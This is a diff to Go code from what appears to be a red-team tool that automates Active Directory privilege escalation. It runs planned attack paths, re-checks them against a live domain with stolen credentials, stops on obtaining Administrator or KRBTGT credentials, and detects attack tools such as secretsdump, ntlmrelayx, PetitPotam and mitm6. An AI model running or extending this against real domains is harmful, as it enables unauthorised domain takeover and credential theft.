+		// ── Optional path execution ────────────────────────────
+		if executePaths && len(baselinePlans) > 0 {
+			fmt.Println("\n[*] Executing best planned paths (reconciliation-gated)...")
+			ctx2, cancel2 := context.WithCancel(context.Background())
+			defer cancel2()
+			executed := ExecuteBestPaths(ctx2, state, baselinePlans, host.IP, result)
+			if executed > 0 {
+				fmt.Printf("[+] Path execution: %d steps completed\n", executed)
+			}
 		}
-	}
 
-	// ── Edge confidence health summary ─────────────────────
-	printConfidenceHealth(state.Edges)
+		// ── Edge confidence health summary ─────────────────────
+		printConfidenceHealth(state.Edges)
 
-	// ── Active re-verification of stale/degraded edges ────
-	if executePaths {
-		domain, user, pass, _ := getCredential(state)
-		if domain != "" && user != "" {
-			reVerified := ReVerifyEdges(ctx, state, domain, user, pass, host.IP, 5)
-			if reVerified > 0 {
-				fmt.Printf("[+] Re-verified %d stale/degraded edges against live AD\n", reVerified)
+		// ── Active re-verification of stale/degraded edges ────
+		if executePaths {
+			domain, user, pass, _ := getCredential(state)
+			if domain != "" && user != "" {
+				reVerified := ReVerifyEdges(ctx, state, domain, user, pass, host.IP, 5)
+				if reVerified > 0 {
+					fmt.Printf("[+] Re-verified %d stale/degraded edges against live AD\n", reVerified)
+				}
+			}
+		}
+
+		delta := classifyDelta(credsBefore, edgesBefore, state)
+		fmt.Printf("[*] Privesc iteration %d/%d complete: delta=%v\n", iter+1, maxIter, delta)
+
+		switch delta {
+		case DeltaNone, DeltaNoise:
+			return result
+		case DeltaCredential:
+			if hasValidatedDA(state) {
+				return result
 			}
 		}
 	}
@@ -987,14 +1017,44 @@ func ExecuteBestPaths(ctx context.Context, state *core.ADState, plans map[string
 	return total
 }
 
+// getAvailableCaps reports which TOOLS are installed on the operator's
+// box. The planner's PlannerConfig.AvailableCaps is matched against
+// each PrivilegeEdge.Requires (which holds tool names like "nxc",
+// "impacket-getST", "bloodyAD"), so this must be a tool-availability
+// list, not a list of capability identifiers.
+//
+// Edges whose Requires don't appear here are penalised by the planner's
+// tooling-gap term but never excluded — they remain reachable.
 func getAvailableCaps() []string {
-	if CapabilityRegistry == nil {
-		return nil
+	candidates := []string{
+		// Network execution & SMB
+		"nxc", "netexec", "crackmapexec",
+		// AD manipulation
+		"bloodyAD", "ldapsearch",
+		// Impacket suite
+		"impacket-secretsdump", "impacket-GetUserSPNs", "impacket-GetNPUsers",
+		"impacket-getTGT", "impacket-getST", "impacket-ticketer",
+		"impacket-psexec", "impacket-wmiexec", "impacket-smbexec",
+		"impacket-ntlmrelayx",
+		// AD CS
+		"certipy", "certipy-ad",
+		// Shadow credentials
+		"pywhisker", "certipy-shadow",
+		// Coercion & relay
+		"coercer", "PetitPotam.py", "dfscoerce.py",
+		"responder", "ntlmrelayx.py",
+		// IPv6 attacks
+		"mitm6",
+		// Tickets
+		"krbrelayx.py", "addspn.py",
 	}
-	return []string{
-		"GENERIC_ALL", "CERT_AUTH", "DCSYNC",
-		"ADD_MEMBER", "FORCE_CHANGE_PASSWORD", "WRITE_DACL",
+	var out []string
+	for _, t := range candidates {
+		if utils.ToolAvailable(t) {
+			out = append(out, t)
+		}
 	}
+	return out
 }
 
 // printConfidenceHealth logs a summary of edge confidence distribution
@@ -1024,4 +1084,26 @@ func printConfidenceHealth(edges []core.PrivilegeEdge) {
 	if suspect > 0 {
 		fmt.Println("    ⚠ Suspect edges detected — planner will deprioritise these paths")
 	}
+}
+
+func classifyDelta(credsBefore, edgesBefore int, state *core.ADState) DeltaClass {
+	if len(state.Creds) > credsBefore {
+		return DeltaCredential
+	}
+	if len(state.Edges) > edgesBefore {
+		return DeltaEdge
+	}
+	return DeltaNoise
+}
+
+func hasValidatedDA(state *core.ADState) bool {
+	for _, c := range state.Creds {
+		if c.Validated && strings.Contains(strings.ToUpper(c.Username), "ADMINISTRATOR") {
+			return true
+		}
+		if c.Validated && strings.Contains(strings.ToUpper(c.Username), "KRBTGT") {
+			return true
+		}
+	}
+	return false
 }
